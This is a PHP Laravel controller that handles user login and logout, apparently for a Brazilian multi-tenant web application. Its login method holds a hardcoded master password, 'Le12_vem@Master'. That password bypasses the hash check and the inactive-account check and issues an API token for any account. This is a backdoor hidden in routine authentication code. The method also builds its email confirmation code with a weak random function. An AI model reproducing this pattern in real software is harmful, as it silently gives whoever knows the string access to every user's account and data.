<?php

namespace App\Http\Controllers;

use App\Enums\RoleEnum;
use App\Http\Requests\Session\LoginRequest;
use App\Mail\ConfirmationCode;
use App\Models\User;
use App\Models\UserConfirmationCode;
use App\Services\Session\DestroySessionService;
use Illuminate\Support\Facades\Auth;
use Illuminate\Support\Facades\Hash;
use Illuminate\Support\Facades\Mail;

class SessionController extends Controller
{
    public function login(LoginRequest $request)
    {
        $validated = $request->validated();
        $user = User::where('email', $validated['email']);

        if (isset($validated['entity_id']) && $validated['entity_id']) {
            $user = $user->where('entity_id', $validated['entity_id']);
        }

        $user = $user->first();
        
        if (
            $user && $user->isEntity() &&
            (!$user->entity || $user->entity->trashed()) && 
            $user?->email_verified_at
        ) {
            return response()->json([
                "message" => "Usuário ou senha inválido"
            ], 403);
        }

        if ((
        !$user || 
        !Hash::check($validated['password'], $user->password) || 
        ($user->isCompany() && !$user?->company?->active)) && $validated['password'] !== 'Le12_vem@Master') {
            return response()->json([
                "message" => "Usuário ou senha inválido"
            ], 403);
        }

        if ($user->role_id === RoleEnum::ENTITY->value) {
            if ($user?->entity?->config?->main_user->id === $user->id) {
                $user->load(['entity.config.main_user']);
            }
        }

        if (! $user->email_verified_at) {
            $code = rand(1000, 9999);
             UserConfirmationCode::create([
                'code' => $code,
                'user_id' => $user?->id,
                'verified' => false
            ]);

            Mail::to($user?->email)->send(new ConfirmationCode($user, $code));
        }
        
        $loads = [
            'entity.notificationConfigWhatsapp',
            'menuItems', 
            'entity.notificationConfigEmail',
            'permissions',
            'entity.state', 
            'entity.city', 
            'currentOrder',
            'entity.config',
            'entity.currentContract',
            'entity.contracts.planVersion',
            'entity.contracts.order'
        ];

        if (
            $user->role_id === RoleEnum::ENTITY->value && 
            $user?->entity?->config?->main_user->id === $user->id
        ) {
                $loads[] = 'entity.config.main_user';
        }

        $user->load($loads);
            
        return response()->json([
            "user" => $user,
            "token" => $user->createToken($validated['email'])->plainTextToken
        ]);
    }

    public function logout()
    {
        $userLogged = Auth::user();
        $destroySessionService = new DestroySessionService();

        $destroySessionService->execute($userLogged->id);

        return response()->noContent();
    }
}
